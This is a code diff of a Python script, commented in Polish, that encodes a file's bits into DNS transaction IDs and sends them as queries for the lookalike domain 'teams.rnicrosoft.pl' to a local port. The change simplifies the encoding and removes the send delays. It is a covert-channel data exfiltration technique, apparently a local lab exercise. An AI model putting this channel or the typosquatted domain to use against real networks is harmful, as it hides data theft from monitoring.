@@ -42,8 +42,8 @@ def send_dns_query(filepath):
     binary_data = ''.join(binary for _, binary in binary_list)
 
     # Start przesylania ukrytej wiadomosci
-    client.sendto(dns_query(SPECIAL_CHAR + 1500, "teams.rnicrosoft.pl").pack(), ('127.0.0.1', 5353))
-    print(f"Sent START TXID: {SPECIAL_CHAR} + 1500")
+    client.sendto(dns_query(SPECIAL_CHAR, "teams.rnicrosoft.pl").pack(), ('127.0.0.1', 5353))
+    print(f"Sent START TXID: {SPECIAL_CHAR}")
 
     try:
         response, _ = client.recvfrom(512)
@@ -58,7 +58,9 @@ def send_dns_query(filepath):
             chunk = chunk.ljust(16, '0')  # Dopelnij zerami do 16 bitów
         
         chunk = mix_two_chars_bits(chunk)
-        txid = int(chunk, 2) + int(modify_txid_based_on_last_bits(chunk)) # Konwersja bitów na int
+        # txid = int(chunk, 2) + int(modify_txid_based_on_last_bits(chunk)) # Konwersja bitów na int
+        txid = int(chunk, 2) # Konwersja bitów na int
+
         
         client.sendto(dns_query(txid, "teams.rnicrosoft.pl").pack(), ('127.0.0.1', 5353))
         print(f"Sent TXID: {txid} (chunk: {chunk})")
@@ -69,14 +71,14 @@ def send_dns_query(filepath):
             dns_response = DNSRecord.parse(response)
             ttl = dns_response.rr[0].ttl if dns_response.rr else 1  # jeśli nie ma rr, domyśl TTL = 1s
             print(f"Received response, sleeping for {ttl} seconds")
-            time.sleep(ttl)
+            # time.sleep(ttl)
         except socket.timeout:
             print("No response received (timeout), sleeping for 1 second")
-            time.sleep(1)
+            # time.sleep(1)
 
     # Koniec przesylania ukrytej wiadomosci
-    client.sendto(dns_query(SPECIAL_CHAR + 1500, "teams.rnicrosoft.pl").pack(), ('127.0.0.1', 5353))
-    print(f"Sent END TXID: {SPECIAL_CHAR} + 1500")
+    client.sendto(dns_query(SPECIAL_CHAR, "teams.rnicrosoft.pl").pack(), ('127.0.0.1', 5353))
+    print(f"Sent END TXID: {SPECIAL_CHAR}")
 
     try:
         response, _ = client.recvfrom(512)
